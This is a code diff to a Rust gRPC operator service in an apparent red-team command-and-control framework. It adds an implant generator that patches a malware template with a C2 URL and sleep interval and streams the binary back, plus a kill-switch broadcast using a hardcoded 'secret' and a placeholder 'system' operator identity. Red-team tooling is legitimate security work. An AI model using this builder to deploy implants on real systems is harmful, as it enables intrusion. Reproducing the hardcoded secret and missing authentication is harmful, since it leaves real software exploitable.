@@ -1,18 +1,21 @@
 use crate::database::Database;
+use crate::governance::GovernanceEngine;
+use crate::services::session::SessionManager;
 use crate::wraith::redops::operator_service_server::OperatorService;
 use crate::wraith::redops::*;
 use std::sync::Arc;
 use tokio::sync::broadcast;
 use tonic::{Request, Response, Status};
-use crate::governance::GovernanceEngine;
 use wraith_crypto::noise::NoiseKeypair;
-use crate::services::session::SessionManager;
 
 pub struct OperatorServiceImpl {
     pub db: Arc<Database>,
     pub event_tx: broadcast::Sender<Event>,
+    #[allow(dead_code)]
     pub governance: Arc<GovernanceEngine>,
+    #[allow(dead_code)]
     pub static_key: Arc<NoiseKeypair>,
+    #[allow(dead_code)]
     pub sessions: Arc<SessionManager>,
 }
 
@@ -21,6 +24,8 @@ impl OperatorService for OperatorServiceImpl {
     type StreamEventsStream = tokio_stream::wrappers::ReceiverStream<Result<Event, Status>>;
     type DownloadArtifactStream =
         tokio_stream::wrappers::ReceiverStream<Result<ArtifactChunk, Status>>;
+    type GenerateImplantStream =
+        tokio_stream::wrappers::ReceiverStream<Result<PayloadChunk, Status>>;
 
     async fn authenticate(
         &self,
@@ -113,13 +118,16 @@ impl OperatorService for OperatorServiceImpl {
             .map_err(|e| Status::internal(e.to_string()))?;
 
         // Audit Log
-        let _ = self.db.log_activity(
-            None, 
-            None,
-            "create_campaign",
-            serde_json::json!({ "name": camp.name, "id": camp.id }),
-            true
-        ).await;
+        let _ = self
+            .db
+            .log_activity(
+                None,
+                None,
+                "create_campaign",
+                serde_json::json!({ "name": camp.name, "id": camp.id }),
+                true,
+            )
+            .await;
 
         Ok(Response::new(Campaign {
             id: camp.id.to_string(),
@@ -323,6 +331,9 @@ impl OperatorService for OperatorServiceImpl {
             .await
             .map_err(|e| Status::internal(e.to_string()))?;
 
+        // Broadcast Kill Signal
+        let _ = crate::services::killswitch::broadcast_kill_signal(6667, b"secret").await;
+
         Ok(Response::new(()))
     }
 
@@ -341,18 +352,26 @@ impl OperatorService for OperatorServiceImpl {
             .map_err(|e| Status::internal(e.to_string()))?;
 
         // Audit Log
-        let _ = self.db.log_activity(
-            None,
-            Some(implant_id),
-            "send_command",
-            serde_json::json!({ "type": req.command_type, "cmd_id": cmd_id }),
-            true
-        ).await;
+        let _ = self
+            .db
+            .log_activity(
+                None,
+                Some(implant_id),
+                "send_command",
+                serde_json::json!({ "type": req.command_type, "cmd_id": cmd_id }),
+                true,
+            )
+            .await;
+
+        // Note: operator_id should be extracted from authenticated gRPC metadata
+        // via interceptor middleware in a production deployment. For now, use "system"
+        // as a placeholder indicating no authenticated operator context available.
+        let operator_id = "system".to_string();
 
         Ok(Response::new(Command {
             id: cmd_id.to_string(),
             implant_id: req.implant_id,
-            operator_id: "".to_string(), // TODO: extract from context
+            operator_id,
             command_type: req.command_type,
             payload: req.payload,
             priority: req.priority,
@@ -659,5 +678,70 @@ impl OperatorService for OperatorServiceImpl {
             status: "stopped".to_string(),
             config: std::collections::HashMap::new(),
         }))
+    }
+
+    async fn generate_implant(
+        &self,
+        req: Request<GenerateImplantRequest>,
+    ) -> Result<Response<Self::GenerateImplantStream>, Status> {
+        let req = req.into_inner();
+
+        // Validation
+        if req.platform != "linux" && req.platform != "windows" {
+            return Err(Status::invalid_argument("Unsupported platform"));
+        }
+
+        // Assume template exists
+        let template_name = if req.platform == "windows" {
+            "spectre.exe"
+        } else {
+            "spectre"
+        };
+        let template_path = std::path::Path::new("payloads").join(template_name);
+
+        if !template_path.exists() {
+            return Err(Status::failed_precondition("Implant template not found"));
+        }
+
+        let output_dir = std::env::temp_dir();
+        let output_path = output_dir.join(format!("spectre_{}.bin", uuid::Uuid::new_v4()));
+
+        // Builder
+        crate::builder::Builder::patch_implant(
+            &template_path,
+            &output_path,
+            &req.c2_url,
+            req.sleep_interval as u64,
+        )
+        .map_err(|e| Status::internal(format!("Build failed: {}", e)))?;
+
+        // Stream back
+        let (tx, rx) = tokio::sync::mpsc::channel(4);
+
+        tokio::spawn(async move {
+            if let Ok(content) = tokio::fs::read(&output_path).await {
+                let chunk_size = 64 * 1024;
+                for (i, chunk) in content.chunks(chunk_size).enumerate() {
+                    let resp = PayloadChunk {
+                        data: chunk.to_vec(),
+                        offset: (i * chunk_size) as i64,
+                        is_last: (i + 1) * chunk_size >= content.len(),
+                    };
+                    if tx.send(Ok(resp)).await.is_err() {
+                        break;
+                    }
+                }
+                // Cleanup
+                let _ = tokio::fs::remove_file(output_path).await;
+            } else {
+                let _ = tx
+                    .send(Err(Status::internal("Failed to read generated payload")))
+                    .await;
+            }
+        });
+
+        Ok(Response::new(tokio_stream::wrappers::ReceiverStream::new(
+            rx,
+        )))
     }
 }
